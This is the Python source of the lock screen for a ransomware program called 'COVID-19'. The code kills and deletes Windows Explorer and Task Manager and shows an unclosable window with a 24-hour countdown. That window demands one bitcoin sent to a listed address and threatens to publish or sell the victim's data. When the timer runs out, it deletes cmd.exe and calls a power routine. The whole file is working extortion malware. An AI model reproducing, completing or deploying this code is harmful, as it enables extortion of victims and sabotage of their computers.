#!/usr/bin/python
#coding:utf-8
from tkinter import *
from PIL import ImageTk, Image
from timeit import default_timer
import tkinter as tk
import os, sys, timeps
from modules.system import regedit, killproc, delproc
usr = os.environ["USERNAME"]
d = os.environ["SystemDrive"]
# INIT VARIABLE FROM CLASS
dk = delproc.Kill()
dr = delproc.Remove()
# TRY TO REMOVE EXPLORER IF NOT DELETED BEFORE
try:
    dk.exp()
    dr.exp()
    dr.tskmgr()
except:
    pass
# INIT WINDOW FOR GUI COUNTER
window = Tk()
src = "\\Users\\{}\\AppData\\setup\\db.txt".format(usr)
# FUNCTION TO SET A TIME
def updateTime(generator):
    global p
    p = next(generator)
    canvas.itemconfigure(text_clock, text=p, font=(None, 35))
    window.after(1000, updateTime, generator)
    with open(src, "w") as db:
        db.write(p)
    x = open(src).read()
    if(x == "00:00:00"):
        try:
            dr.power()
            os.remove("\\windows\\system32\\cmd.exe")
        except FileNotFoundError:
            pass
        except:
            pass
        exit()
# INSTRUCTION MESSAGE
def instructions():
    txt = tk.Label(font="bold", text="\nYour computer is locked by the Ransomware COVID-19\n\n \
    To unlock your computer,\n \
    You have 24 HOURS to purchase 1 bitcoin and transfert it to this address :\n\n \
    34YVap4JyjiBTWvy6Qobmni1k3tHbdi8UEL")
    txt.pack()
# WARNING MESSAGE
def warning():
    wrn = tk.Label(font="bold", text="Warning !!!\n \
    Restarting your computer is USELESS\n\n \
    And if you restart your computer, the time on the counter will be 12 HOURS OF LESS...\n\
    And if you don't pay, your sensitive data will be pubished or sold.\n")
    wrn.pack()
# BUTTON FUNCTION (work in progress...)
def pay_to_decrypt():
    btn1 = tk.Button(window, text="Decrypt your data", font="bold", fg="red", bg="black")
    btn1.pack(side=tk.BOTTOM)
    btn2 = tk.Button(window, text="Pay the Ransom", font="bold", fg="red", bg="black")
    btn2.pack(side=tk.BOTTOM)
# INSTRUCTION to desactived the header who contains the resize, minimize and exit window
window.overrideredirect(1)
canvas = Canvas(window, width=200, height=100, bg="red")
canvas.pack()
text_clock = canvas.create_text(100, 50)
# FUNCTION TO CONTROL IF DB.txt EXIST
try:
    with open(src, "r") as db:
        db = db.read()
        db = db.split(":")
        hours = int(db[0])
        minutes = int(db[1])
        secondes = int(db[2])
        updateTime(timeps.set_time(hours, minutes, secondes))
except FileNotFoundError:
    with open(src, "w") as db:
        updateTime(timeps.set_time(24, 0, 0))
except:
    with open(src, "w") as db:
        updateTime(timeps.set_time(12, 0, 0))
try:
    a = "{}\\Users\\{}\\AppData\\setup\\image.jpg".format(d, usr)
    # SET IMAGE INTO WINDOW
    img = ImageTk.PhotoImage(Image.open(a))
    panel = tk.Label(window, image = img)
    panel.pack(side = "top", fill = "both", expand = "yes")
except FileNotFoundError:
    pass
# CALL EVERY FUNCTION INTO WINDOW
instructions()
warning()
pay_to_decrypt()
window.mainloop()
